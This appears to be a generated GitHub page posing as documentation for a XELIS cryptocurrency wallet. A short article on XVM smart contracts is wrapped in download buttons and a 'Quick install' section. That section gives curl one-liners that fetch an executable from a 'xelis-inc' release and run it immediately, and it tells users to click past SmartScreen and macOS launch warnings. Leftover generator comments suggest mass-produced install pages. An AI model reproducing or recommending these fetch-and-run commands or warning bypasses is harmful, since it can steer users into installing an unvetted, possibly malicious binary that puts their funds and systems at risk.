![XELIS smart contracts on the XVM and XELIS Wallet](assets/banner-article.png)
# XELIS smart contracts on the XVM and XELIS Wallet

Chain capability, client capability, and the gap between them.

## Downloads - Contracts

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> A chain that can run contracts does not make every wallet a contract tool.

Smart contracts on XELIS run on the XELIS Virtual Machine. XELIS Wallet's documented role is holding and transferring XEL, so treat contract execution as a chain feature and check the client's own release notes before assuming the app can call one.

<!-- ARTICLE-BODY-BEGIN -->
## What the XVM is

The XELIS Virtual Machine is the execution environment for smart contracts on XELIS. Contracts are deployed to the chain and run there, with the network recording the result, in the same way it records a transfer.

That makes the XVM a property of the network rather than of any client. A wallet can hold the asset a contract uses without containing a single line of contract tooling.

The practical reason a wallet holder cares is fees and records: a contract call is still a transaction, so it costs a network fee and appears in history like any other entry. Whether the client you use can build that call is the separate question below.

## Confidential state and contracts

XELIS encrypts amounts, and contract execution sits on the same chain, so the interesting question is what a contract can compute without publishing values. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-confidential-transactions.md">Confidential transactions in XELIS Wallet</a> explains the encryption model that contract state inherits.

What this article will not do is describe contract APIs, gas rules or deployment steps. Those belong to developer documentation, and inventing them here would produce code that does not run.

## What the wallet does and does not do

The wallet holds XEL, signs transfers and shows balances. Whether it can call a contract, display a token or browse deployed contracts is a client question, and it is not verified for this release.

The distinction is worth holding onto: the chain supporting assets and contracts says nothing about what the desktop app renders. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-or-web-wallet-desktop.md">Desktop or web wallet for XEL</a> covers client capability as a general trade-off.

## How to check before you rely on it

Read the release notes for the version you installed, and test with a small amount before committing anything meaningful. If a feature is not mentioned there, treat it as absent rather than assume it is hidden in a menu.

The chain-level picture, including how blocks and contracts relate, is in <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-what-is-xelis-chain.md">XELIS chain basics</a>.

The client you would use for it is the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>, which is also where any change in app behaviour would be announced.

## FAQ
### Does XELIS Wallet support smart contracts?
The XELIS chain runs contracts on the XVM. Whether this desktop client can interact with them is not verified here, so check the release notes for your version.

### Does XELIS Wallet support tokens or assets?
The chain supports assets beyond simple transfers; wallet-side asset display is a client feature and is not documented in these pages.

### Can I deploy a contract from the wallet?
Not according to anything verified here. Deployment needs developer tooling, which is outside the wallet's documented role.

### Do contract transactions cost fees?
Yes, contract execution is a network operation and pays the same kind of fee as a transfer.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS chain basics](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-what-is-xelis-chain.md)
- [Confidential transactions in XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-confidential-transactions.md)
- [Desktop or web wallet](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-or-web-wallet-desktop.md)
- [XELIS BlockDAG explained](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-blockdag-block-time.md)
